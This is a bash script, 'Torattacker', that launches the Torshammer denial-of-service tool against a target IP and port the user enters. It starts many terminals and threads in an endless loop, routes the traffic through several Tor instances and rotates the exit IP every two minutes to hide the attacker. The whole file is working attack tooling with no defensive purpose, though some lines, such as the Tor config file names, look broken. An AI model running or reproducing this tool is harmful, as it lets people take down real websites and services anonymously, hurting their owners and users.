#!/usr/bin/bash
# Torattacker: DDoS Tool Beta v1.4 using Torshammer
# Coded by: @thesixtynine
# Github: https://github.com/thesixtynine/Tor

clear

trap 'printf "\n";stop;exit 1' 2

checkroot() {

if [[ "$(id -u)" -ne 0 ]]; then
   printf "\e[1;77m Please, run this program as root!\n\e[0m"
   exit 1
fi

}

dependencies() {

command -v tor > /dev/null 2>&1 || { echo >&2 "I require tor but it's not installed. Run ./install.sh. Aborting."; exit 1; }
command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not installed. Run ./install.sh. Aborting."; exit 1; }
command -v openssl > /dev/null 2>&1 || { echo >&2 "I require openssl but it's not installed. Run ./install.sh Aborting."; exit 1; }

command -v awk > /dev/null 2>&1 || { echo >&2 "I require awk but it's not installed. Aborting."; exit 1; }
command -v sed > /dev/null 2>&1 || { echo >&2 "I require sed but it's not installed. Aborting."; exit 1; }
command -v cat > /dev/null 2>&1 || { echo >&2 "I require cat but it's not installed. Aborting."; exit 1; }
command -v tr > /dev/null 2>&1 || { echo >&2 "I require tr but it's not installed. Aborting."; exit 1; }
command -v wc > /dev/null 2>&1 || { echo >&2 "I require wc but it's not installed. Aborting."; exit 1; }
command -v cut > /dev/null 2>&1 || { echo >&2 "I require cut but it's not installed. Aborting."; exit 1; }
command -v uniq > /dev/null 2>&1 || { echo >&2 "I require uniq but it's not installed. Aborting."; exit 1; }

if [ $(ls /dev/urandom >/dev/null; echo $?) == "1" ]; then
echo "/dev/urandom not found!"
exit 1
fi

}

changeip() {

killall -HUP tor

}

banner() {

printf "\n"
printf "\e[1;35m ▄▄▄▄▄▄▄▄     \e[1;92m█▀\e[0m\n"
printf "\e[1;35m ▀▀▀██▀▀▀   ▄████▄    ██▄████ \e[0m\e[1;77m  ░░░░░░░░░░░░░░░░░░░░░░░░░\e[0m\n"
printf "\e[1;35m    ██     ██▀\e[1;47\e[0m██\e[1;95m▀██   ██▀     \e[0m\e[1;77m  ░░░\e[1;91m█▀█\e[0m\e[1;77m░\e[1;91m▀█▀\e[0m\e[1;77m░\e[1;91m█▀█\e[0m\e[1;77m░\e[1;91m█▀▀\e[0m\e[1;77m░\e[1;91m█\e[0m\e[1;77m░\e[1;91m█\e[0m\e[1;77m░░░\e[0m\n"
printf "\e[1;35m    ██     ██\e[1;47\e[0m████\e[1;95m██   ██      \e[0m\e[1;77m  ░░░\e[1;91m█▀█\e[0m\e[1;77m░░\e[1;91m█\e[0m\e[1;77m░░\e[1;91m█▀█\e[0m\e[1;77m░\e[1;91m█\e[0m\e[1;77m░░░\e[1;91m█▀▄\e[0m\e[1;77m░░░\e[0m\n"
printf "\e[1;35m    ██     ▀██▄▄██▀   ██      \e[0m\e[1;77m  ░░░\e[1;91m▀\e[0m\e[1;77m░\e[1;91m▀\e[0m\e[1;77m░░\e[1;91m▀\e[0m\e[1;77m░░\e[1;91m▀\e[0m\e[1;77m░\e[1;91m▀\e[0m\e[1;77m░\e[1;91m▀▀▀\e[0m\e[1;77m░\e[1;91m▀\e[0m\e[1;77m░\e[1;91m▀\e[0m\e[1;77m░░░\e[0m\n"
printf "\e[1;35m    ▀▀       ▀▀▀▀     ▀▀      \e[0m\e[1;77m  ░░░░░░░░░░░░░░░░░░░░░░░░░\e[0m\n"
printf "\n"
printf "\e[100m:    Tor Attacker Beta v1.4, Coded by: @thesixtynine     :\e[0m\n"
printf "\n"

}

config() {

default_portt="80"
default_threads="600"
default_tor="y"

read -p $'\e[0m[\e[1;92m#\e[0m] \e[1;77mTarget \e[0m( IP ): \e[1;77m' target

read -p $'\e[0m[\e[1;93m+\e[0m] \e[1;77mPort \e[0m(Default 80): \e[1;77m' portt
portt="${portt:-${default_portt}}"

read -p $'\e[0m[\e[1;94m@\e[0m] \e[1;77mThreads: \e[0m(Default 600): \e[1;77m' threads
threads="${threads:-${default_threads}}"

read -p $'\e[0m[\e[1;95m$\e[0m] \e[1;77mTerminals \e[0m(Default 4): \e[1;77m' inst
inst="${inst:-${default_inst}}"

read -e -p $'\e[0m[\e[1;96m&\e[0m] \e[1;77mAnonymized Via \e[0m[ TOR ] \e[1;77m(start tor before) \e[0m[Y/n]: \e[1;77m' tor
printf "\e[0m"
tor="${tor:-${default_tor}}"

if [[ $tor == "y" || $tor == "Y" ]]; then
readinst
printf "\e[0m[\e[1;91m!\e[0m] \e[1;77mPress Ctrl + C to stop attack\n"
attacktor

else
attack
fi

}

readinst() {

default_inst="3"

read -p $'\e[0m[\e[1;91m/\e[0m] \e[1;77mTor Instances \e[0m(default 3): \e[1;77m' inst
inst="${inst:-${default_inst}}"
multitor

}

attacktor() {

#let i=1
while true; do
  let ii=1
  while [ $ii -le $inst ]; do
porttor=$((9050+$ii))
#printf "\e[1;92m[*] Attack through Tor Port: %s\e[0m\n" $porttor
gnome-terminal -- torsocks -P $porttor python torshammer/torshammer.py -t $target -p $portt -r $threads
ii=$((ii+1))
done
sleep 120
changeip
let i=1
let porttor=$((9050+$i))
done

}

attack() {

default_inst="4"
read -p $'\e[0m[\e[1;94m+\e[0m] \e[1;77mTerminals \e[0m(Default 4): \e[1;77m' inst
inst="${inst:-${default_inst}}"
printf "\e[0m[\e[1;91m!\e[0m] \e[1;77m Press Ctrl + C to stop attack\n"
i=1
while true; do
  let i=1
  while [[ $i -le $inst ]]; do

gnome-terminal -- python torshammer/torshammer.py -t $target -p $portt -r $threads
i=$((i+1))
done
sleep 120
killall python
done

}

checktor() {

let i=1
checkcount=0

while [[ $i -le $inst ]]; do
port=$((9050+$i))
printf "\e[0m[\e[1;93m*\e[0m] \e[1;77mChecking Tor connection on port:\e[0m %s\e[0m..." $port
check=$(curl --socks5-hostname localhost:$port -s https://www.google.com > /dev/null; echo $?)

if [[ "$check" -gt 0 ]]; then
printf "\e[0mFailed!\n"

else
printf "\e[0mOk!\n"
let checkcount++
fi
i=$((i+1))
done

if [[ $checkcount != $inst ]]; then
echo
printf "\e[0m[\e[1;94m1\e[0m] \e[1;77mIt Requires All Tor Running!\n"
printf "\e[0m[\e[1;94m2\e[0m] \e[1;77mCheck Again\n"
printf "\e[0m[\e[1;94m3\e[0m] \e[1;77mRestart\n"
printf "\e[0m[\e[1;94m0\e[0m] \e[1;77mExit\n"
echo

read -p $'\e[0m[\e[1;92m+\e[0m] \e[1;77mChoose an option: \e[0m' fail

if [[ $fail == "1" ]]; then
checktor

elif [[ $fail == "2" ]]; then
stop
multitor

elif [[ $fail == "3" ]]; then
clear
banner
config

elif [[ $fail == "0" ]]; then
echo
printf "\e[0m[\e[1;91m!\e[0m] \e[1;77mExit The Programm!\n"
echo
sleep 1
exit 1

else
echo
printf "\e[0m[\e[1;91m!\e[0m] \e[1;77mInvalid Option!\n"
echo
sleep 1
clear
banner
config
fi
fi

}

multitor() {

echo
if [[ ! -d multitor ]]; then
mkdir multitor;
fi
default_ins="1"
inst="${inst:-${default_inst}}"
let i=1

while [[ $i -le $inst ]]; do
port=$((9050+$i))
printf "SOCKSPort %s\nDataDirectory /var/lib/tor%s" $port $i > multitor/multitor$i.
printf "\e[0m[\e[1;92m*\e[0m] \e[1;77mStarting Tor On Port:\e[0m 905%s\e[0m\n" $i.
tor -f multitor/multitor$i > /dev/null &
sleep 10
i=$((i+1))
done
checktor

}

stop() {

killall -2 tor > /dev/null 2>&1
echo
printf "\e[0m[\e[1;91m!\e[0m] \e[1;77mAll Tor Connection Stopped.\e[0m\n"
echo

}

#checkroot
#checktor
#dependencies
banner
config
